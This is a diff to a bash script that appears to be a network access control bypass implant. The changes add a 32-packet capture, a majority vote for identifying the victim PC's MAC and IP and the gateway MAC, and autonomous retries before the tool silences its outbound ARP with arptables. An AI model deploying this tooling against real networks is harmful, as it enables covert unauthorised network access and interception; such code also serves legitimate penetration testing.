@@ -11,7 +11,7 @@ set -e
 # -----
 
 ## Variables
-VERSION="0.6.5-1787207350"
+VERSION="0.6.5-1792571215"
 RANDOMIZE=0
 
 CMD_ARPTABLES=/usr/sbin/arptables
@@ -53,6 +53,8 @@ else
     BRGW="169.254.${THIRD_OCTET}.1" # Gateway IP address for the bridge
 fi
 
+MAX_AUTONOMOUS_RETRIES=5
+CAPTURE_COUNT=32
 TEMP_FILE=/tmp/tcpdump.pcap
 OPTION_RESPONDER=0
 OPTION_SSH=0
@@ -134,7 +136,7 @@ IsValidIp() {
     local octet
     [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]] || return 1
     for octet in ${ip//./ }; do
-        (( octet <= 255 )) || return 1
+        (( 10#$octet <= 255 )) || return 1
     done
 }
 
@@ -314,7 +316,7 @@ ConnectionSetup() {
         echo
     fi
 
-    # Best-effort: not every driver supports forcing a renegotiation
+    ## Best-effort: not every driver supports forcing a renegotiation
     ethtool -r $COMPINT 2>/dev/null || true
     ethtool -r $SWINT 2>/dev/null || true
 
@@ -324,52 +326,83 @@ ConnectionSetup() {
         echo
     fi
 
-    ## PCAP and look for SYN packets coming from the victim PC to get the source IP, source mac, and gateway MAC
-    # TODO: Replace this with tcp SYN OR (udp && not broadcast? need to tell whos source and whos dest)
-    # TODO: Replace with actually pulling from the source interface?
+    ## PCAP and look for SYN packets coming from the victim PC to get the source IP address, source mac, and gateway MAC
+    ## We capture 32 packets by default and run a vote to identify the most likely network configuration
+    ATTEMPT=1
+    while :; do
 
-    if [[ -n "$COMPMAC" && -n "$COMIP" && -n "$GWMAC" ]]; then
-        echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
-        echo -e "$INFO [ * ] Skip packet capture as values are manually provided $TXTRST"
-    else
-        echo -e "$INFO [ * ] Listening for TCP traffic...$TXTRST"
-        tcpdump -i $COMPINT -s0 -w $TEMP_FILE -c1 'tcp[13] & 2 != 0'
-    fi
+        if [[ -n "$COMPMAC" && -n "$COMIP" && -n "$GWMAC" ]]; then
+            echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
+            echo -e "$INFO [ * ] Skip packet capture as values are manually provided $TXTRST"
+        else
+            echo -e "$INFO [ * ] Listening for TCP traffic ($CAPTURE_COUNT packets)...$TXTRST"
+            tcpdump -i $COMPINT -s0 -w $TEMP_FILE -c $CAPTURE_COUNT 'tcp[13] & 18 == 2'
+        fi
 
-    if [ -z "$COMPMAC" ]; then
-        COMPMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
-    fi
+        CAPTURE_OK=1
+        if [[ -z "$COMPMAC" || -z "$GWMAC" || -z "$COMIP" ]]; then
 
-    if [ -z "$GWMAC" ]; then
-        GWMAC=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}'`
-    fi
+            SAMPLES=`tcpdump -r $TEMP_FILE -nne tcp 2>/dev/null | awk '{print $2","$4$10}' | cut -f 1-4 -d.`
 
-    if [ -z "$COMIP" ]; then
-        COMIP=`tcpdump -r $TEMP_FILE -nne -c 1 tcp | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`
-    fi
+            ## Tally identical triples; the most frequent one sorts to the top
+            VOTE=`echo "$SAMPLES" | sort | uniq -c | sort -rn -k1,1`
+            TOTAL=`echo "$SAMPLES" | grep -c .`
+            TOP_COUNT=`echo "$VOTE" | head -n 1 | awk '{print $1}'`
+            TOP_TRIPLE=`echo "$VOTE" | head -n 1 | awk '{print $2}'`
 
-    if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
-        echo
-        echo -e "$INFO [ * ] Processing packet and setting variables $TXTRST"
-        echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
-        echo
-    fi
+            if [ "$TOTAL" -eq 0 ]; then
+                echo -e "$WARN [ ! ] No TCP SYN packets were captured. Re-run, check the interface, or supply -t/-g/-T manually.$TXTRST"
+                CAPTURE_OK=0
+            elif [ "$TOTAL" -lt "$CAPTURE_COUNT" ]; then
+                echo -e "$WARN [ ! ] Only captured $TOTAL of the requested $CAPTURE_COUNT packet(s) - capture was cut short, refusing to vote on an incomplete sample. Re-run, check the interface, or supply -t/-g/-T manually.$TXTRST"
+                CAPTURE_OK=0
+            elif [ -z "$TOP_COUNT" ] || [ $(( TOP_COUNT * 2 )) -le "$TOTAL" ]; then
+                echo -e "$WARN [ ! ] Captured $TOTAL packet(s) but found no clear majority for a single MAC/IP address pairing (best guess seen in only $TOP_COUNT of $TOTAL). Re-run to sample again, or supply -t/-g/-T manually.$TXTRST"
+                CAPTURE_OK=0
+            else
+                [ -z "$COMPMAC" ] && COMPMAC=`echo "$TOP_TRIPLE" | awk -F ',' '{print $1}'`
+                [ -z "$GWMAC" ] && GWMAC=`echo "$TOP_TRIPLE" | awk -F ',' '{print $2}'`
+                [ -z "$COMIP" ] && COMIP=`echo "$TOP_TRIPLE" | awk -F ',' '{print $3}'`
+            fi
+        fi
 
-    ## Validate what we captured (or were given) before we act on it
-    if ! IsValidMac "$COMPMAC"; then
-        echo -e "$WARN [ ! ] Could not determine a valid victim MAC address (COMPMAC='$COMPMAC'). Re-run with -t <MAC> to set it manually.$TXTRST"
+        if [ "$OPTION_AUTONOMOUS" -eq 0 ]; then
+            echo
+            echo -e "$INFO [ * ] Processing packet and setting variables $TXTRST"
+            echo -e "$INFO [ * ] Info: COMPMAC: $COMPMAC, GWMAC: $GWMAC, COMIP: $COMIP $TXTRST"
+            echo
+        fi
+
+        ## Validate what we captured (or were given) before we act on it
+        if [ "$CAPTURE_OK" -eq 1 ]; then
+            if ! IsValidMac "$COMPMAC"; then
+                echo -e "$WARN [ ! ] Could not determine a valid victim MAC address (COMPMAC='$COMPMAC'). Re-run with -t <MAC> to set it manually.$TXTRST"
+                CAPTURE_OK=0
+            elif ! IsValidMac "$GWMAC"; then
+                echo -e "$WARN [ ! ] Could not determine a valid gateway MAC address (GWMAC='$GWMAC'). Re-run with -g <MAC> to set it manually.$TXTRST"
+                CAPTURE_OK=0
+            elif ! IsValidIp "$COMIP"; then
+                echo -e "$WARN [ ! ] Could not determine a valid victim IP address (COMIP='$COMIP'). Re-run with -T <IP> to set it manually.$TXTRST"
+                CAPTURE_OK=0
+            fi
+        fi
+
+        [ "$CAPTURE_OK" -eq 1 ] && break
+
+        ## Decide whether to retry. Only autonomous mode retries at all
+        if [ "$OPTION_AUTONOMOUS" -ne 0 ] && [ "$ATTEMPT" -lt "$MAX_AUTONOMOUS_RETRIES" ]; then
+            ATTEMPT=$((ATTEMPT + 1))
+            echo -e "$WARN [ ! ] Autonomous mode: retrying capture automatically (attempt $ATTEMPT/$MAX_AUTONOMOUS_RETRIES)...$TXTRST"
+            ## Clear only the values that came from capture, so this attempt
+            ## listens fresh instead of re-using last attempt's (bad) answer
+            COMPMAC=""
+            GWMAC=""
+            COMIP=""
+            continue
+        fi
+
         exit 1
-    fi
-
-    if ! IsValidMac "$GWMAC"; then
-        echo -e "$WARN [ ! ] Could not determine a valid gateway MAC address (GWMAC='$GWMAC'). Re-run with -g <MAC> to set it manually.$TXTRST"
-        exit 1
-    fi
-
-    if ! IsValidIp "$COMIP"; then
-        echo -e "$WARN [ ! ] Could not determine a valid victim IP address (COMIP='$COMIP'). Re-run with -T <IP> to set it manually.$TXTRST"
-        exit 1
-    fi
+    done
 
     ## Going Silent
     $CMD_ARPTABLES -A OUTPUT -o $SWINT -j DROP
